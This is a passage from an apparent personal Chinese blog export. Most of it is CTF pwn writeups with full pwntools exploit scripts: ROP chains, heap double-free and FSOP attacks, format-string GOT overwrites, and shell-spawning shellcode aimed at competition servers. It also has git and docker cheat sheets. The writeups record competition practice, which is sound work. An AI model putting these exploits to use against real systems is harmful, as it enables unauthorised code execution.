os='linux')\nelf=ELF('rop')\np=remote('ctf.v50to.cc',11822)\n#p=process('./rop')\nexit_got=elf.got['_exit']\nopen_plt=elf.plt['open']\nread_plt=elf.plt['read']\nwrite_plt=elf.plt['write']\npop_rdi_ret=0x0000000000401483\npop_rsi_r15_ret=0x0000000000401481\npop_rbp_ret=0x00000000004011fd\n\np.sendlineafter(\"your choice:\",b'4919')\npayload=b'a'*256+p64(0x000000000404060+0x100+0x500+8)+p64(0x000000000401304)\nsleep(1)\np.send(payload)\n\nsleep(1)\n#attach(p)\n#起始于0x000000000404060+0x100+0x500+8\npayload=(p64(pop_rdi_ret)+p64(0x000000000404060+0x100+0x500+8-104)+p64(pop_rsi_r15_ret)+p64(4)+p64(0)+\\\n         p64(open_plt)+p64(pop_rbp_ret)+p64(4212328+0x70-0x100-0x30)+p64(0x000000000401304)+\\\n         p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_r15_ret)+p64(0x000000000404060)+p64(0)+\\\n         p64(read_plt)+p64(pop_rdi_ret)+p64(1)+p64(write_plt)+p64(0x00000000040139C)+b'./flag\\x00r\\x00'\n         ).ljust(256,b'a')+p64(0x000000000404060+0x500)+p64(0x000000000401304)\n        #0x100\np.send(payload)\n#跳转到0x000000000404060+0x500\nsleep(1)\np.send(b'lalala')\n\nsleep(1)\np.send(b'lalala')\np.interactive()\n\n'''\nGadgets information\n============================================================\n0x000000000040147c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x000000000040147e : pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401480 : pop r14 ; pop r15 ; ret\n0x0000000000401482 : pop r15 ; ret\n0x000000000040147b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x000000000040147f : pop rbp ; pop r14 ; pop r15 ; ret\n0x00000000004011fd : pop rbp ; ret\n0x0000000000401483 : pop rdi ; ret\n0x0000000000401481 : pop rsi ; pop r15 ; ret\n0x000000000040147d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x000000000040101a : ret\n0x0000000000401277 : ret 0x2be\n\n\n\n'''\n```\n\n\n\n# heap\n\n```\nfrom pwn import *\n\ncontext(log_level='debug')\n#p=process('./ezheap')\np=remote(\"ctf.qwq.cc\",13288)\nelf=ELF('ezheap')\nlibc=ELF('libc-2.23.so')\n\ndef add(size,name,kind):\n    p.sendlineafter(\"Your choice : \",b'1')\n    p.sendlineafter(\"Length of the name :\",str(size))\n    p.sendafter(\"The name of animal :\",name)#buf\n    p.sendlineafter(\"The kind of the animal :\",kind)#scanf\n\ndef dele(num):\n    p.sendlineafter(\"Your choice : \",b'3')\n    p.sendlineafter(\"Which animal do you want to remove from the cage:\",str(num))\n\n\ndef show():\n    p.sendlineafter(\"Your choice : \", b'2')\n#attach(p)\nadd(0x58,b'heshi',b'1')\nadd(0x58,b'heshi',b'1')\n\ndele(0)\ndele(1)\ndele(0)\n\nadd(0x58,p64(0x000000000602018-0x10-14),b'1')#可修改的内容在这个地址后16字节\nadd(0x58,b'0',b'1')\nadd(0x58,b'0',b'1')\nadd(0x58,b'0'*14,b'1')\n\nshow()\n\nlibc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))-libc.sym['free']\nprint(hex(libc_base))\none=[0x45226,0x4527a,0xf03a4,0xf1247]\none_gadget=libc_base+one[1]\n\ndele(3)\ndele(4)\ndele(3)\n\n\nadd(0x58,p64(0x000000000602018-0x10-14),b'1')#可修改的内容在这个地址后16字节\nadd(0x58,b'0',b'1')\nadd(0x58,b'0',b'1')\n#attach(p)\nadd(0x58,b'0'*22+p64(one_gadget),b'1')\n\np.interactive()\n```\n\n# 爆破版（暂存）\n\n```\nfrom pwn import *\n\n\ndef add(size, name, kind):\n    p.sendlineafter(\"Your choice : \", b'1')\n    p.sendlineafter(\"Length of the name :\", str(size))\n    p.sendlineafter(\"The name of animal :\", name)  # buf\n    p.sendlineafter(\"The kind of the animal :\", kind)  # scanf\n\n\ndef dele(num):\n    p.sendlineafter(\"Your choice : \", b'3')\n    p.sendlineafter(\"Which animal do you want to remove from the cage:\", str(num))\n\n\ndef show():\n    p.sendlineafter(\"Your choice : \", b'2')\n\n\ndef pwn(i):\n    elf = ELF('ezheap')\n    # attach(p)\n    add(0x58, b'heshi', b'1')\n    add(0x58, b'heshi', b'1')\n    add(0x58, b'heshi', b'1')\n\n    dele(0)\n    dele(1)\n    dele(0)\n\n\n    add(0x58, p64(0x602018 - 0x10 - i), b'1')  # 可修改的内容在这个地址后16字节\n    add(0x58, b'heshi', b'1')\n    add(0x58, b'heshi', b'1')\n\n\ncontext(log_level='debug')\nfor i in range(0x58):\n    p = process('./ezheap')\n\n    pwn(i)\n    try:\n        #attach(p)\n        add(0x58, b'heshi', b'1')\n        wrong = p.recvline()\n        if b'malloc():' in wrong:\n            continue\n        print(i)\n        p.interactive()\n    except:\n        pass\n\n\n\n```\n\n# one爆破（不知道libc_main在哪）\n\n```\nfrom pwn import *\n\ncontext.log_level='debug'\ndef pwn(i):\n    #p = process(\"./one\")\n    p=remote(\"ctf.qwq.cc\",13351)\n    p.recvuntil(\"= \")\n    main = p.recvuntil(\" and\")[:-4]\n    main = int(main, 16)\n    base_process = main - 0x13B8\n    exit_addr = base_process + 0x4050\n    p.recvuntil(\"=  \")\n    stack = p.recvuntil(\"\\n\")[:-1]\n    stack = int(stack, 16)\n    print(hex(base_process))\n    print(hex(stack))\n    #attach(p)\n    p.sendlineafter(\"What address you want to write?\", hex(exit_addr))\n    p.sendlineafter(\"What value you want to write?\",str(i))\n    p.sendlineafter(\"What address you want to modify?\",hex(stack))\n    print(i)\n    p.interactive()\n\n\nfor i in range(0x100):\n    try:\n        pwn(i)\n    except:\n        pass\n```\n\n\n\n# one正式\n\n```\nfrom pwn import *\n\ncontext(arch='amd64', log_level='debug', os='linux')\n#p = process(\"./one\")\np=remote(\"ctf.qwq.cc\",13392)\n\np.recvuntil(\"= \")\nmain = p.recvuntil(\" and\")[:-4]\nmain = int(main, 16)\nbase_process = main - 0x13B8\nexit_addr = base_process + 0x4050\ntarget = base_process + 0x12A0\n\np.recvuntil(\"=  \")\n\nstack = p.recvuntil(\"\\n\")[:-1]\nstack = int(stack, 16)\nprint(hex(base_process))\nprint(hex(stack))\n# attach(p)\n# 第一次，改exit的got到libc_main_start,死循环\np.sendlineafter(\"What address you want to write?\", hex(exit_addr))\np.sendlineafter(\"What value you want to write?\", str(240))\np.sendlineafter(\"What address you want to modify?\", hex(base_process + 0x1000))\n\n# 第二次修改read的大小，变成栈溢出\np.sendlineafter(\"What address you want to write?\", hex(target))\np.sendlineafter(\"What value you want to write?\", str(0xAA))\n\n\nshell = asm(shellcraft.sh())\npayload = (hex((stack//0x1000)*0x1000).encode() + b'\\x00').ljust(0x20, b'a')+p64(stack-1000) + p64(stack + 0x7ffe8f0733f0 - 0x7ffe8f07351c) + shell\n#attach(p)\np.sendlineafter(\"What address you want to modify?\", payload)\n\np.interactive()\n\n```\n\n# note暂存（做不出来）\n\n```\nfrom pwn import *\n\ncontext(log_level='debug')\np=process('./eznote')\n#p=remote(\"ctf.qwq.cc\",13395)\n\nelf=ELF('ezheap')\nlibc=ELF('libc-2.23.so')\n\ndef add(size,context):\n    p.sendafter(\"Your choice\",b'1')\n    p.sendafter(\"Length of Note\",str(size))\n    p.sendafter(\"Content of Note:\",context)#buf\n\ndef edit(index,size,context):\n    p.sendafter(\"Your choice\", b'2')\n    p.sendafter(\"Index :\",str(index))\n    p.sendafter(\"Length of Note : \", str(size))\n    p.sendafter(\"Content of Note\", context)  # buf\n\n\ndef show(index):\n    p.sendafter(\"Your choice \", b'3')\n    p.sendafter(\"Index\",str(index))\n\np.recvuntil(\"A gift for you~: \")\nheap=p.recvline()[:-1]\nheapbase=int(heap,16)-0x55eace242010+0x55eace242000\nprint(hex(heapbase))\nsleep(1)\n\nadd(0x10,b'123')\npayload=b'a'*0x10+p64(0xffffffffffffffff)+b\"\\xb1\\x00\\x00\"\nedit(0,0x50,payload)\nadd(0x100,b'123')\nadd(0x40,b'a'*8)\n\nshow(2)\n\np.recvuntil('aaaaaaaa')\nlibcbase=u64(p.recv(6).ljust(8,b'\\x00'))+0x7f363b43c000-0x7f363b800b78\nprint(hex(libcbase))\n\nio_list_all=libcbase+libc.symbols['_IO_list_all']\nsystem_addr=libcbase+libc.symbols['system']\nrealloc_hook=libcbase+libc.symbols['__realloc_hook']\n\nlog.success(\"heapbase: \"+hex(heapbase))\nlog.success(\"realloc_hook: \"+hex(realloc_hook))\n\n\nvtable_addr = heapbase +0x140\n\npad =p64(0)*3+p64(system_addr) # vtable\npad += p32(6)+p32(6)+p64(0)\n\nstream = b\"/bin/sh\\x00\"+p64(0x61)\nstream += p64(0xddaa)+p64(io_list_all-0x10)\nstream +=p64(1)+p64(2) # fp->_IO_write_ptr > fp->_IO_write_base\nstream = stream.ljust(0xc0,b\"\\x00\")\nstream += p64(0) # mode<=0\nstream += p64(0)\nstream += p64(0)\nstream += p64(vtable_addr)\n\npayload = pad + stream\n\nattach(p,\n       '''\n       finish\\n\n       \n       ''')\nedit(0,0x800,payload)\n\np.recvuntil('Your choice : ')\np.sendline(str(1))\np.interactive()\n\n\n# gdb.attach(r,\n#     '''\n#     b*$rebase(0xda5)\\n\n#     c\\n\n#     vmmap\\n\n#     '''\n#     )\n```\n\n# 1024\n\n复制分组对抗的exp，改端口，通\n\n# 逆向\n\n逆向部分除了ezida是自己自己动调的，剩下全看百度，如有疑问私我，我给你演示怎么搜。（ps：我猜cc也看不到这句话）\n\n# web\n\n上网一搜，参数一换，通\n\n# 杂项\n\n## 噩梦\n\nwps提取图片，根据大小排列，出\n\n## 踩踩\n\n搜文件名，下软件，提取图片里面隐藏的图片。塞软件，出。\n\n# 密码1\n\n随波逐流一把梭\n\n","categories":["参赛WP"]},{"title":"23省赛WP","url":"/2023/07/23/WP/23%E7%9C%81%E8%B5%9BWP/","content":"\n# lvyou——可以爆破的一个小pwn\n\n很简单就溢出了，但是由于开启了pie所以函数的基址不确定，所以采用爆破\n\n![image-20230723215437204](/images_of_shengsai/image-20230723215437204.png \"\")\n\n```python\nfrom pwn import*\n#p=process('./lvyou')\nfor i in range(500):\n    p=remote(\"121.196.192.181\",10001)\n    #p = process('./lvyou')\n    payload=b'a'*0x28+p8(0x9a)+p8(0x52)\n    p.recvuntil(b'choice :\\n')\n    p.sendline(b'1')\n    p.send(payload)\n    p.interactive()\n```\n","categories":["参赛WP"]},{"title":"git和docker常用指令","url":"/2023/09/23/%E5%A4%87%E5%BF%98/git%E5%92%8Cdocker%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/","content":"\n# git基础指令\n\n![a](/img/git.jpg \"git\")\n\n![b](/img/e77eaf4aa96665d7af71e6d4a4dc6e53.jpg \"docr\")\n\n### 1、仓库\n\n```text\n# 在当前目录新建一个Git代码库\n$ git init\n\n# 新建一个目录，将其初始化为Git代码库\n$ git init [project-name]\n\n# 下载一个项目和它的整个代码历史\n$ git clone [url]\n```\n\n### 2、配置\n\n```text\n# 显示当前的Git配置\n$ git config --list\n\n# 编辑Git配置文件\n$ git config -e [--global]\n\n# 设置提交代码时的用户信息\n$ git config [--global] user.name \"[name]\"\n$ git config [--global] user.email \"[email address]\"\n```\n\n### 3、增加/删除文件\n\n```text\n# 添加指定文件到暂存区\n$ git add [file1] [file2] ...\n\n# 添加指定目录到暂存区，包括子目录\n$ git add [dir]\n\n# 添加当前目录的所有文件到暂存区\n$ git add .\n\n# 添加每个变化前，都会要求确认\n# 对于同一个文件的多处变化，可以实现分次提交\n$ git add -p\n\n# 删除工作区文件，并且将这次删除放入暂存区\n$ git rm [file1] [file2] ...\n\n# 停止追踪指定文件，但该文件会保留在工作区\n$ git rm --cached [file]\n\n# 改名文件，并且将这个改名放入暂存区\n$ git mv [file-original] [file-renamed]\n```\n\n### 4、代码提交\n\n```text\n# 提交暂存区到仓库区\n$ git commit -m [message]\n\n# 提交暂存区的指定文件到仓库区\n$ git commit [file1] [file2] ... -m [message]\n\n# 提交工作区自上次commit之后的变化，直接到仓库区\n$ git commit -a\n\n# 提交时显示所有diff信息\n$ git commit -v\n\n# 使用一次新的commit，替代上一次提交\n# 如果代码没有任何新变化，则用来改写上一次commit的提交信息\n$ git commit --amend -m [message]\n\n# 重做上一次commit，并包括指定文件的新变化\n$ git commit --amend [file1] [file2] ...\n```\n\n### 5、分支\n\n```text\n# 列出所有本地分支\n$ git branch\n\n# 列出所有远程分支\n$ git branch -r\n\n# 列出所有本地分支和远程分支\n$ git branch -a\n\n# 新建一个分支，但依然停留在当前分支\n$ git branch [branch-name]\n\n# 新建一个分支，并切换到该分支\n$ git checkout -b [branch]\n\n# 新建一个分支，指向指定commit\n$ git branch [branch] [commit]\n\n# 新建一个分支，与指定的远程分支建立追踪关系\n$ git branch --track [branch] [remote-branch]\n\n# 切换到指定分支，并更新工作区\n$ git checkout [branch-name]\n\n# 切换到上一个分支\n$ git checkout -\n\n# 建立追踪关系，在现有分支与指定的远程分支之间\n$ git branch --set-upstream [branch] [remote-branch]\n\n# 合并指定分支到当前分支\n$ git merge [branch]\n\n# 选择一个commit，合并进当前分支\n$ git cherry-pick [commit]\n\n# 删除分支\n$ git branch -d [branch-name]\n\n# 删除远程分支\n$ git push origin --delete [branch-name]\n$ git branch -dr [remote/branch]\n```\n\n### 6、标签\n\n```text\n# 列出所有tag\n$ git tag\n\n# 新建一个tag在当前commit\n$ git tag [tag]\n\n# 新建一个tag在指定commit\n$ git tag [tag] [commit]\n\n# 删除本地tag\n$ git tag -d [tag]\n\n# 删除远程tag\n$ git push origin :refs/tags/[tagName]\n\n# 查看tag信息\n$ git show [tag]\n\n# 提交指定tag\n$ git push [remote] [tag]\n\n# 提交所有tag\n$ git push [remote] --tags\n\n# 新建一个分支，指向某个tag\n$ git checkout -b [branch] [tag]\n```\n\n### 7、查看信息\n\n```text\n# 显示有变更的文件\n$ git status\n\n# 显示当前分支的版本历史\n$ git log\n\n# 显示commit历史，以及每次commit发生变更的文件\n$ git log --stat\n\n# 搜索提交历史，根据关键词\n$ git log -S [keyword]\n\n# 显示某个commit之后的所有变动，每个commit占据一行\n$ git log [tag] HEAD --pretty=format:%s\n\n# 显示某个commit之后的所有变动，其\"提交说明\"必须符合搜索条件\n$ git log [tag] HEAD --grep feature\n\n# 显示某个文件的版本历史，包括文件改名\n$ git log --follow [file]\n$ git whatchanged [file]\n\n# 显示指定文件相关的每一次diff\n$ git log -p [file]\n\n# 显示过去5次提交\n$ git log -5 --pretty --oneline\n\n# 显示所有提交过的用户，按提交次数排序\n$ git shortlog -sn\n\n# 显示指定文件是什么人在什么时间修改过\n$ git blame [file]\n\n# 显示暂存区和工作区的差异\n$ git diff\n\n# 显示暂存区和上一个commit的差异\n$ git diff --cached [file]\n\n# 显示工作区与当前分支最新commit之间的差异\n$ git diff HEAD\n\n# 显示两次提交之间的差异\n$ git diff [first-branch]...[second-branch]\n\n# 显示今天你写了多少行代码\n$ git diff --shortstat \"@{0 day ago}\"\n\n# 显示某次提交的元数据和内容变化\n$ git show [commit]\n\n# 显示某次提交发生变化的文件\n$ git show --name-only [commit]\n\n# 显示某次提交时，某个文件的内容\n$ git show [commit]:[filename]\n\n# 显示当前分支的最近几次提交\n$ git reflog\n```\n\n### 8、远程同步\n\n```text\n# 下载远程仓库的所有变动\n$ git fetch [remote]\n\n# 显示所有远程仓库\n$ git remote -v\n\n# 显示某个远程仓库的信息\n$ git remote show [remote]\n\n# 增加一个新的远程仓库，并命名\n$ git remote add [shortname] [url]\n\n# 取回远程仓库的变化，并与本地分支合并\n$ git pull [remote] [branch]\n\n# 上传本地指定分支到远程仓库\n$ git push [remote] [branch]\n\n# 强行推送当前分支到远程仓库，即使有冲突\n$ git push [remote] --force\n\n# 推送所有分支到远程仓库\n$ git push [remote] --all\n```\n\n### 9、撤销\n\n```text\n# 恢复暂存区的指定文件到工作区\n$ git checkout [file]\n\n# 恢复某个commit的指定文件到暂存区和工作区\n$ git checkout [commit] [file]\n\n# 恢复暂存区的所有文件到工作区\n$ git checkout .\n\n# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变\n$ git reset [file]\n\n# 重置暂存区与工作区，与上一次commit保持一致\n$ git reset --hard\n\n# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变\n$ git reset [commit]\n\n# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致\n$ git reset --hard [commit]\n\n# 重置当前HEAD为指定commit，但保持暂存区和工作区不变\n$ git reset --keep [commit]\n\n# 新建一个commit，用来撤销指定commit\n# 后者的所有变化都将被前者抵消，并且应用到当前分支\n$ git revert [commit]\n\n# 暂时将未提交的变化移除，稍后再移入\n$ git stash\n$ git stash pop\n```\n\n### 10、其他\n\n```text\n# 生成一个可供发布的压缩包\n$ git archive\n```\n\n# docker常用指令\n\n```shell\ndocker version \t\t# 显示docker版本信息\ndocker info \t\t# 显示docker系统系统信息，镜像以及容器数量等信息\ndocker 命令 --help\t# 帮助命令\n```\n\n\n\n```\nattach    Attach to a running container        \t\t\t#当前she11下attach 连接指定运行镜像\nbuild    Build an image from a Dockerfile        \t\t#通过Dockerfile定制镜像\ncommit    Create a new image from a container changes   #提交当前容器为新的镜像\ncp    Copy files/folders from the containers filesystem to the host path   #从容器中拷贝指定文件或者目录到宿主机中\ncreate    Create a new container        \t\t\t\t#创建一个新的容器，同run,但不启动容器\ndiff    Inspect changes on a container's filesystem     #查看docker 容器变化\nevents    Get rea1 time events from the server        \t#从docker 服务获取容器实时事件\nexec    Run a command in an existing container        \t#在已存在的容器上运行命令\nexport    Stream the contents of a container as a tar archive   #导出容器的内容流作为一个tar 归档文件[对应import ]\nhistory    show the history of an image        \t\t\t#展示一个镜像形成历史\nimages    List images        \t\t\t\t\t\t\t#列出系统当前镜像\nimport    Create a new filesystem image from the contents of a tarba1l     #从tar包 中的内容创建-一个新的文件系统映像[对应export]\ninfo    Display system-wide informati on        \t\t#显示系统相关信息\ninspect    Return 1ow-1evel information on a container  #查看容器详细信息\nkill    Ki11 a running container        \t\t\t\t# kill指定docker容器\nload    Load an image from a tar archive        \t\t#从一个tar包中加载一个镜像[对应save]\nlogin    Register or Login to the docker registry server   #注册或者登陆一个docker源服务器\nlogout    Log out from a Docker registry server        \t#从当前Docker registry 退出\nlogs    Fetch the 1ogs of a container        \t\t\t#输出当前容器日志信息\nport    Lookup the public-facing port which is NAT-ed to PRIVATE_ PORT    #查看映射端口对应的容器内部源端口\npause    Pause a11 processes within a container        \t#暂停容器\nps    List containers        \t\t\t\t\t\t\t#列出容器列表\npull    Pull an image or a repository from the docker registry server     # 从docker镜像源服务器拉取指定镜像或者库镜像\npush    Push an image or a repository to the docker registry server        #推送指定镜像或者库镜像至docker源服务器\nrestart    Restart a running container        \t\t\t#重启运行的容器\nrm    Remove one or more containers    \t\t\t\t\t#移除一个或者多个容器\nrmi    Remove one or more i mages        \t\t\t\t#移除一个或多个镜像[无容器使用该镜像才可删除，否则需删除相关容才可继续或-f强制删除]\nrun    Run a command in a new container        \t\t\t#创建一个新的容器并运行一个命令\nsave    Save an image to a tar archive    \t\t\t\t#保存一个镜像为一个tar包[对应1oad]\nsearch    Search for an image on the Docker Hub        \t#在docker hub中搜索镜像\nstart    Start a stopped containers        \t\t\t\t#启动容器\nstop    Stop a running containers        \t\t\t\t#停止容器\ntag    Tag an image into a repository    \t\t\t\t#给源中镜像打标签\ntop    Lookup the running processes of a container   \t#查看容器中运行的进程信息\nunpause    Unpause a paused container        \t\t\t#取消暂停容器\nversion    Show the docker vers ion informati on        #查看docker版本号\nwait     Block uyntil a container stops，then print its exit code   #截取容器停止时的退出状态值\n\n```\n\n","categories":["备忘"]},{"title":"网安先锋者","url":"/2023/10/10/WP/%E7%BD%91%E5%AE%89%E5%85%88%E9%94%8B%E8%80%85WP/","content":"\n# 沙盒orw且分段shellcode\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext(arch='amd64', log_level='debug', os='linux')\np =process(\"./shellcode\")\nelf=ELF('shellcode')\n#p = remote('39.100.87.38',23081)\npop_rdi_ret=0x0000000000400863\njmp_rsp=0x0000000000400785\nvuln=0x000000000400760\nmain = elf.sym['main']\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\n\n#第一段shellcode，制造一个flag，地址给r12（给rdi会被中途破坏掉）给open预备里面有push，所以是0x28\nshellcode1='''\n    push 0x67616c66\n    mov r12,rsp\n    sub rsp,0x28 \n    ret\n'''\n#拿到libc\npayload=p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)+b'a'*8+p64(jmp_rsp)+asm(shellcode1) #8字节\np.sendlineafter(\"Can u pwn me?\",payload)\nputs_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(hex(puts_addr))\nlibc = LibcSearcher('puts', puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nopen_addr = libc_base + libc.dump('open')\nread_addr = libc_base + libc.dump('read')\nwrite_addr = libc_base + libc.dump('write')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\nret_addr=0x000000000040053e\n#利用第一个sc放到r12里的flag传给rdi，准备好所有寄存器，调用open\nshellcode2='''\nmov rdi,r12\nxor esi,esi\nsub rsp,0x30\nret\n'''\npayload=p64(open_addr)+p64(main)+b'a'*24+p64(jmp_rsp)+asm(shellcode2) #8字节\np.sendlineafter(\"Can u pwn me?\",payload)\n\n#准备read的寄存器\nshellcode3='''\n    mov rsi,rsp\n    mov edx,0x100\n    xor eax,eax\n    sub rsp,0x30\n    ret\n'''\n#调用read\npayload=p64(pop_rdi_ret) + p64(3) + p64(read_addr) + p64(main)+b'a'*8+p64(jmp_rsp)+asm(shellcode3) #8字节\np.sendafter(\"Can u pwn me?\",payload)\n\n\n#直接调用write(1,file,0x100)\nshellcode4='''\n    mov edi,1\n    mov rsi,rsp\n    push 1\n    pop rax\n    syscall\n    ret\n'''\npayload=p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)+b'a'*8+p64(jmp_rsp)+asm(shellcode4) #8字节\np.sendlineafter(\"Can u pwn me?\",payload)\np.interactive()\n```\n\n# 不稳定的ez_ret2_backdoor\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext(arch='amd64', log_level='debug', os='linux')\n#p =process(\"./pwn\")\n#elf=ELF('shellcode')\np = remote('39.100.87.38',23127)\n#attach(p)\npayload=p32(0x0804849B)*11+b'a'\np.sendlineafter(\"Welcome to Partial_overwrite\",payload)\np.interactive()\n```\n\n","categories":["参赛WP"]},{"title":"搭建网站用到的站","url":"/2023/11/20/%E5%A4%87%E5%BF%98/%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99%E7%94%A8%E5%88%B0%E7%9A%84%E7%AB%99/","content":"\n国外手机号收验证码（付费）：https://sms-activate.org/ru\n\nopenai： https://chat.openai.com\n\nvercel部署gpt教程：https://github.com/Yidadaa/ChatGPT-Next-Web\n\n买梯子（按流量买还不错）：http://124.221.218.32:8081/\n\n免费图床：[用户后台首页 - ImgURL后台管理](https://www.imgurl.org/vip/manage)\n\n搭建hexo网站和配置butterfly主题用到的网站：\n\n[hexo+github博客的搭建以及butterfly主题的安装_butterfly 安装_在养老的年轻人的博客-CSDN博客](https://blog.csdn.net/qq_73975638/article/details/128995798?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-128995798-blog-106980497.235^v38^pc_relevant_sort&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-128995798-blog-106980497.235^v38^pc_relevant_sort&utm_relevant_index=2)\n\n[Hexo个人博客主题和看板娘_csdn个人中心看板娘_Carey Howe的博客-CSDN博客](https://blog.csdn.net/weixin_57349957/article/details/125428655)\n\n[hexo个人博客搭建（二）butterfly主题配置](https://www.yii666.com/blog/349859.html)\n\n[Hexo博客的使用 - 知乎](https://zhuanlan.zhihu.com/p/554325282)\n\n[Butterfly 博客主题搭建系列：基础教程 | 枫叶](https://blog.aqcoder.cn/posts/447d/#文章锚点)\n\n买域名：[云解析 DNS](https://dns.console.aliyun.com/?spm=5176.100251.111252.21.4e4f4f15oTSgwS#/dns/setting/heshi906.xyz)\n\n部署服务器：https://vercel.com/dashboard\n\n","categories":["备忘"]},{"title":"分组对抗-1-OK-WP","url":"/2023/08/24/WP/%E5%88%86%E7%BB%84%E5%AF%B9%E6%8A%97-1-OK-WP/","content":"\n# super——idol\n\n![image-20230822144053385](C:\\Users\\heshi\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230822144053385.png)\n\nhttps://blog.csdn.net/m0_73644864/article/details/128985892\n\ncsdn大法，秒了\n\n# 尊嘟假嘟\n\n我觉得这更像一段逆向，他甚至抹了符号表，我哭死\n\n```\nfrom pwn import *\ncontext.log_level=\"debug\"\np=remote(\"ctf.v50to.cc\",10281)\n#p=process(\"./pwn\")\np.sendline(\"O.O\")\nsleep(1)\np.sendline(\"O.O\")\npop_rdi_ret=0x0000000000401bb3\npayload=b'O.o'+b'\\0'+b'a'*0x74+p64(pop_rdi_ret)+p64(0)+p64(0x0000000004015FE)\np.sendlineafter(\"o.oo.oo.oo.o o.oO.O O.Oo.oO.Oo.o O.Oo.oO.O o.o o.oO.Oo.o? (O.O/o.o)\",payload)\n\np.interactive()\n```\n\n[尊嘟](/downloads_fenzu/zundu)\n\n# pwn2\n\n一道简单的fmt，改putchar_got到后门\n\n```\nfrom pwn import *\ncontext.log_level=\"debug\"\ncontext(log_level = \"debug\",arch = \"amd64\",os = \"linux\")\n#p = process(\"./2048\")\np=remote(\"ctf.v50to.cc\",10259)\nelf = ELF(\"./2048\")\n\nputchar_got = elf.got['putchar']\nprint(putchar_got)\nsys_plt = 0x000000000401DB6\n\noffset = 6\npayload = fmtstr_payload(offset, {putchar_got: sys_plt})\np.sendlineafter(\"start: \", payload)\nsleep(1)\np.interactive()\n```\n\n[点我下载](/downloads_fenzu/2048)\n\n# pwn4\n\n一个简单的shellcode绕过，限制是可见字符，搜索各种指令的机器码，push为可见范围内，再加一个00绕过后续检查，再用一个pop消除push的影响，下面粘贴通用的shellcode\n\n```\nfrom pwn import *\ncontext.log_level=\"debug\"\ncontext(log_level = \"debug\",arch = \"amd64\",os = \"linux\")\n#p = process(\"./runner\")\np=remote(\"ctf.v50to.cc\",10265)\nshellcode = asm('''\n        /* execve(path='/bin///sh', argv=['sh'], envp=0) */\n        /* push b'/bin///sh\\x00' */\n        push 0x00\n        pop rsi\n        push 0x68\n        mov rax, 0x732f2f2f6e69622f\n        push rax\n        mov rdi, rsp\n        /* push argument array ['sh\\x00'] */\n        /* push b'sh\\x00' */\n        push 0x1010101 ^ 0x6873\n        xor dword ptr [rsp], 0x1010101\n        xor esi, esi /* 0 */\n        push rsi /* null terminate */\n        push 8\n        pop rsi\n        add rsi, rsp\n        push rsi /* 'sh\\x00' */\n        mov rsi, rsp\n        xor edx, edx /* 0 */\n        /* call execve() */\n        push 59 /* 0x3b */\n        pop rax\n        syscall\n\n    ''')\n\np.sendlineafter(\"shell\",shellcode)\n\np.interactive()\n```\n\n[点我下载](/downloads_fenzu/runner)\n\n# abcgame\n\n前面的剪刀石头布无所谓，三分之一的概率，不需要写脚本爆破，后面是一个泄露canary和rbp，NX没关，直接在栈里面写shellcode，再用rbp计算得shellcode起始位置，把puts的got改过去，后续运行到puts时就会getshell\n\n```\nfrom pwn import *\ncontext(log_level=\"debug\", arch=\"amd64\", os=\"linux\")\n\nelf = ELF(\"abcgame\")\n\nmain_addr = elf.sym['main']\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\n#p = process(\"./abcgame\")\np = remote(\"ctf.v50to.cc\", 10372)\n# p=process(\"./fmt\")\n\n\nname = b'a'* (0x30-8)+b'^'\np.sendafter(\"name?\", name)\np.recvuntil(\"^\")\ncanary_and_rbp_old=p.recvuntil(\",\")\ncanary=u64(p8(0)+canary_and_rbp_old[:-7])\nrbp_old=u64(canary_and_rbp_old[7:-1]+p16(0))\n\nprint(hex(canary))\nprint(hex(rbp_old))\ngift=b'a'* (0x30-8)+b'\\0'\np.sendafter(\"gift\", gift)\n\n\np.sendafter(\"choice?\\n\", b'a')\nfmt=fmtstr_payload(6, {puts_got : rbp_old-0x70+51})\nshellcode=asm(shellcraft.sh())\npadding=(0x70-8)\nshell = shellcode.ljust(padding,b'\\x90')\npayload=shell+p64(canary)+p64(rbp_old+1000)+p64(rbp_old-0x70)\nsleep(0.5)\np.sendafter(\"Which flag do you want?\",payload)\n\np.interactive()\n```\n\n[点我下载](/downloads_fenzu/abcgame)\n\n# babyre\n\ncc的pwn实在做不了了，去看了个re，区段名被修改了的upx，查到修改以后的区段名，replace回upx，直接upx -d，得到源exe文件\n\n在里面找到了一个加密函数，以及flag加密后的结果，\n\n```\n char str[30]=\n    {\n        0xA,0x6, 0x6E, 0x2E, 0xBE, 0x41, 0x79, 0x6E, 0x94, 0x2C, 0x7E, 0x43, 0xC1, 0x39, 0xA4, 0x5A, 0x52,\n        0x17, 0x78, 0x6E, 0x94, 0x1D, 0x6C, 0x2B, 0x88, 0x1D, 0x9D, 0x42, 0x7d\n    };\n    \n int v6=114514;\n for ( j = 0; ; ++j )\n  {\n    v3 = j;\n    if ( v3 >= strlen(Str) )\n      break;\n    Str[j] = (Str[j] ^ Str[j + 1]) + v6 * (j % 2);\n  }\n```\n\n我直接一个逆向c代码\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include<string.h>\nint main()\n{\n    char miwen[30]=\n    {\n        0xA,0x6, 0x6E, 0x2E, 0xBE, 0x41, 